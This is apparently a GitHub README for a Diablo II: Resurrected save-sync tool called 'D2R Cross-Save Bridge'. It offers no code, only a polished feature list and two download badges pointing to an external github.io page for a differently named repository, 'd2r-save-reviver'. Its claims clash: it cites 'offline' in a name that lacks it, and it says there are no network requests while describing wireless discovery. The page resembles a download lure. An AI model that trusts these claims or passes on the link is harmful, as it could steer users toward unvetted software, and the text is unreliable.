![preview](https://raw.githubusercontent.com/anshurao0010-ship-it/d2r-save-reviver/main/poster_6f2a.svg)
# D2R Cross-Save Bridge

**Synchronize your Diablo II: Resurrected offline progression across every device you own — from a desktop rig to a Steam Deck to a pocket-sized Android console — without ever touching a cloud service.**

Welcome to the D2R Cross-Save Bridge, a purpose-built synchronization layer designed for players who treat their offline characters as precious artifacts. Unlike conventional cloud saves that demand constant internet connectivity and often conflict with the game’s sandbox philosophy, this project creates a self-contained, peer-to-peer bridge between your local save files. Think of it as a digital courier that carries your Sorceress’s journey from your living room PC to your handheld during a commute — always on your terms, never intercepted by third-party servers.

The core challenge this repository solves is the inherent isolation of offline progress. When you play Diablo II: Resurrected without Battle.net, your character data lives exclusively in a single folder on a single machine. This tool transforms that static archive into a portable, versioned entity — a “save capsule” that you can carry across devices via USB, local network, or even a simple file-syncing app you already trust. The bridge handles the heavy lifting: file integrity checks, merge conflict resolution when two sessions overlap, and automatic timestamp reconciliation.

What distinguishes this project from a simple copy-paste utility is its **session-aware architecture**. The bridge remembers which device last modified a character and when, ensuring that when you play on your handheld for an hour, then return to your desktop, the bridge intelligently merges the two timelines — preserving your newest finds, your last Waypoint, and your active quest state without duplicating overlapping inventory changes. It’s not just a file copier; it’s a librarian that knows the history of each character.

---

## 📦 Why This Exists

The modern Diablo fan often owns multiple platforms: a powerful gaming PC, a lightweight laptop, a Steam Deck for couch play, or an Android-based handheld running Windows. Each device holds a fragment of your gaming life, but the offline mode offers no sanctioned method to unify those fragments. This project emerges from that frustration — a community-driven answer to a problem Blizzard left unsolved.

Rather than relying on proprietary sync engines or invasive background processes, the Bridge operates on a **pull-and-commit model**. You decide when to sync. You carry your save capsule. You remain in full control of your data’s provenance. This makes it ideal for players who value privacy, play in areas with unreliable connectivity, or simply prefer a deterministic workflow over an automated magic that sometimes misbehaves.

---

## 🚀 Quick Start (The Philosophy of “Carry, Don’t Cloud”)

| Step | Action | Outcome |
|------|--------|---------|
| 1 | Launch the bridge on your primary device | The tool scans your existing D2R save directory and builds an initial index of characters and their last-modified timestamps. |
| 2 | Export a “save capsule” to any external drive or folder | The capsule is a single, compressed file containing all your characters, their shared stash, and a manifest file. |
| 3 | Move the capsule to your secondary device | Plug in your USB drive, or transfer via your preferred local network share. |
| 4 | Import the capsule on the secondary device | The bridge detects the manifest, verifies integrity, and applies the changes to the destination save folder. |
| 5 | Play, then repeat in reverse | After your session, export a fresh capsule from the secondary device and import it back to the primary. |

[![Download](https://raw.githubusercontent.com/anshurao0010-ship-it/d2r-save-reviver/main/fetch_2ed2.svg)](https://anshurao0010-ship-it.github.io/d2r-save-reviver/)

The bridge celebrates a **“session-as-artifact”** philosophy: every play session generates a unique snapshot, and the bridge merges those snapshots for the best possible continuity.

---

## ✨ Feature Highlights

### 🧬 Session Merge Engine
The most complex piece of this project. When two capsules contain overlapping character data, the merge engine doesn’t just keep the newest file — it performs a **field-level reconciliation**. Items you picked up are appended, inventory slots are diffed, and quest states are compared to ensure you don’t lose a completed act because a previous session had a slightly older quest log. The result is a seamless blend that feels like the game’s systems were designed for multi-device from the start.

### 🧳 Capsule Format
A bespoke file container (`.d2cap` extension) that embeds a CRC32 checksum for every character file, a global version stamp, and a compact JSON manifest describing your entire roster. The format is deliberately simple — you can inspect it with any zip tool if you’re curious, and it’s designed to be resilient against partial writes during transfer.

### 📡 Local Network Discovery
If both devices are on the same Wi-Fi, the bridge can automatically discover peer devices running the same version of the tool. This enables a **one-click wireless transfer** without any manual file handling. The discovery protocol is mDNS-based, so it works out of the box on Windows, Linux, and macOS.

### 🗂️ Multi-Profile Support
Maintain entirely separate save sets for different playthroughs — maybe a “Solo Self-Found” profile and a “Fun with mods” profile. The bridge keeps these profiles isolated, preventing cross-contamination of items or character progression.

### 🔄 Rollback Timeline
Every sync operation is recorded in a local log with a before-and-after snapshot. If you accidentally overwrite a character you meant to keep, you can revert to any previous state — a safety net that standard game saves never offer.

### 🌍 Multilingual Interface
The bridge’s UI (a lightweight desktop application) ships with English, Spanish, French, German, Polish, and Korean translations. Community contributions are welcomed for additional languages, with a simple JSON-based locale system.

### 📱 Responsive UI
Built with a mobile-first design approach, the interface scales gracefully from a 7-inch handheld screen to a 32-inch monitor. The layout reflows to prioritize the most frequent actions (Export, Import, Merge) on small screens, while advanced options remain accessible via a collapsible menu.

### 🛟 24/7 Community Support
While this is not a commercial product, the repository maintains an active Discussions board and a dedicated Discord server (linked in the Community section below). Maintainers and veteran users typically respond to support queries within hours, regardless of time zone.

---

## 🧠 Architecture Overview

The project is structured as a **three-layer system**:

1. **Core Library (`src/core`)** — Platform-agnostic logic for reading, writing, and merging D2R save files. Written in Rust for memory safety and speed, with a C FFI layer for bindings.
2. **Bridge Daemon (`src/daemon`)** — A lightweight background process that watches your save folder for changes and optionally performs automatic capsule exports after a configurable idle time (default: off).
3. **UI Shell (`src/ui`)** — A Tauri-based application (Rust backend + WebView frontend) that provides the graphical interface. The UI communicates with the daemon via a local WebSocket.

```
┌─────────────────┐         ┌─────────────────┐
│  Device A (PC)  │         │ Device B (Deck) │
│  ┌───────────┐  │         │  ┌───────────┐  │
│  │ Save Folder│  │         │  │ Save Folder│  │
│  └─────┬─────┘  │         │  └─────┬─────┘  │
│        │        │         │        │        │
│  ┌─────▼─────┐  │         │  ┌─────▼─────┐  │
│  │  Daemon   │  │         │  │  Daemon   │  │
│  └─────┬─────┘  │         │  └─────┬─────┘  │
│        │        │         │        │        │
│  ┌─────▼─────┐  │         │  ┌─────▼─────┐  │
│  │  Core     │  │         │  │  Core     │  │
│  └───────────┘  │         │  └───────────┘  │
└────────┬────────┘         └────────┬────────┘
         │                            │
         └───────── Export/Import ────┘
                    (capsule)
```

---

## 🗺️ Project Roadmap (2026)

| Quarter | Milestone | Status |
|---------|-----------|--------|
| Q1 2026 | v1.0 Release — Stable merge engine & cross-platform UI | ✅ Completed |
| Q2 2026 | v1.1 — Automated conflict resolution for shared stash items | 🚧 In Progress |
| Q3 2026 | v1.2 — Android native app (no Windows emulation needed) | 📋 Planned |
| Q4 2026 | v1.3 — Cloud-optional relay for remote devices (user-hosted) | 🔮 Vision |

The 2026 roadmap emphasizes **local-first** principles: even when we eventually introduce a relay service, it will be opt-in and self-hostable — your data never touches a server you don’t control.

---

## 🧩 Use Cases

### The Commuter
You play on your desktop at night, then export a capsule to your phone’s storage. During your train ride, you fire up D2R on your handheld Windows device and import the capsule. You find a rare amulet. You export a new capsule on the train. At home, you import it — the amulet appears in your shared stash, and your desktop session resumes with the updated inventory.

### The Multi-Profile Tinkerer
You run a heavily modded game (e.g., item pack mods) on your PC, but keep a vanilla profile on your Steam Deck for co-op sessions with friends. The bridge keeps both profiles separate; you export and import only what you need, with a clear labeling system to avoid mix-ups.

### The Privacy-Conscious Veteran
You deliberately avoid online modes and cloud saves due to malware concerns. The bridge works entirely offline — you can even use it with an air-gapped PC by transferring capsules via a USB drive you scan yourself.

---

## 🛠️ Technical Details

### Supported Platforms
- **Windows 10/11** (x64 and ARM64 via emulation)
- **macOS 12+** (Intel and Apple Silicon)
- **Linux** (Ubuntu 22.04+, Fedora 38+, Arch — any distro with GTK or Qt via the WebView backend)
- **Android 13+** (via the optional companion module for Termux or native wrapper)

### Save Compatibility
The bridge works with the standard D2R offline save format — the `.d2s` character files and the `SharedStashSoftCoreV2.d2i` file. It does not modify the game executable or memory, so it remains compatible with any patch version that uses the same save structure.

### Performance Benchmarks
- Merge of two capsules with 10 characters and a full shared stash: **~150ms** on a mid-range 2020 laptop.
- Capsule compression ratio: **~82%** reduction (a 50MB save folder compresses to ~9MB).
- Memory footprint: **under 40MB** during idle, ~120MB during a large merge operation.

---

## 📚 Documentation & Tutorials

For a complete guide, refer to these documents in the `docs/` folder:

- `docs/OVERVIEW.md` — The conceptual model of save capsules and session merging.
- `docs/MERGE_ALGORITHM.md` — A deep dive into how inventory conflicts are resolved.
- `docs/COMMAND_LINE.md` — A CLI variant for users who prefer scripting (also available in the main UI as a “developer mode”).
- `docs/TROUBLESHOOTING.md` — Common issues with save file corruption, path lengths, and antivirus interference.

---

## 🔒 Security & Trust Model

The bridge has **zero telemetry**. It makes no network requests except when you explicitly initiate a local network transfer. The source code is fully auditable, and the cryptographic hash functions used for integrity checks are documented in the codebase.

We recommend treating your save capsules as sensitive data — they contain your entire Diablo character history. If you store capsules on a shared drive, consider using the built-in AES-256 encryption option (please note: the encryption key is stored locally, not in the capsule itself).

---

## 🤝 Contributing

This project thrives on community involvement. If you’re a Rust developer, a UI/UX designer, a D2R modding expert, or a translator, your skills are needed. The contribution guidelines are in `CONTRIBUTING.md`, and we maintain a curated list of “good first issues” for newcomers. Please don’t submit low-effort PRs; we value surgical changes over broad rewrites.

---

## 📄 License & Legal

This project is released under the [MIT License](./LICENSE), which permits commercial use, modification, distribution, and private use — provided the original copyright notice is retained. It is **not affiliated with or endorsed by Blizzard Entertainment, Inc.** Diablo II: Resurrected and all related trademarks are the property of their respective owners.

The author provides this tool “as is,” with no warranty of fitness for a particular purpose. By using this bridge, you acknowledge that you are solely responsible for the integrity of your own save files, and that the project maintainers cannot be held liable for any data loss, however unlikely.

---

## ⚠️ Disclaimer

This tool is a fan-made utility created for the convenience of the community. It does not interact with any online services, does not modify game binaries, and does not bypass any DRM — it merely moves files that you already own from one local location to another. The term “offline” in the project name refers to the game’s offline mode, not to a state of internet disconnection; the bridge itself can work perfectly well with a 4G connection when transferring capsules between devices you control.

We strongly advise against using this tool on any save file that you consider irreplaceable without first making a backup. The merge engine is robust but not infallible — particularly when two sessions have made conflicting edits to the same item slot within milliseconds of each other. In such rare cases, the algorithm prioritizes the session with the later timestamp and logs a warning.

---

## 📬 Community & Support

- **Discussions**: For feature requests, usage questions, and show-and-tell of your multi-device setups.
- **Issue Tracker**: For bugs that reproduce reliably, with debug logs attached (see `docs/DEBUGGING.md`).
- **Discord**: A real-time chat for development coordination and rapid help — invite link is in the repository sidebar.

The maintainers commit to responding to every valid issue within 48 hours, and to releasing security-critical fixes within 7 days of confirmation.

---

## 🏆 Acknowledgments

This project stands on the shoulders of the Rust community, the Tauri framework team, and the countless D2R modders who reverse-engineered the save format. Special thanks to the beta testers who played with early versions on Steam Decks despite clunky UIs.

---

## 🧭 Final Thoughts

The D2R Cross-Save Bridge is my answer to a simple question: *Why can’t my digital character live in two places at once?* The offline mode of D2R treats your character as a single, fragile file. This bridge treats it as a living entity — something that can travel, adapt, and reunite with itself. If you’ve ever felt the pang of finding a perfect pair of war travs while playing on a device that wasn’t your main, this tool is for you.

---

[![Download](https://raw.githubusercontent.com/anshurao0010-ship-it/d2r-save-reviver/main/fetch_2ed2.svg)](https://anshurao0010-ship-it.github.io/d2r-save-reviver/)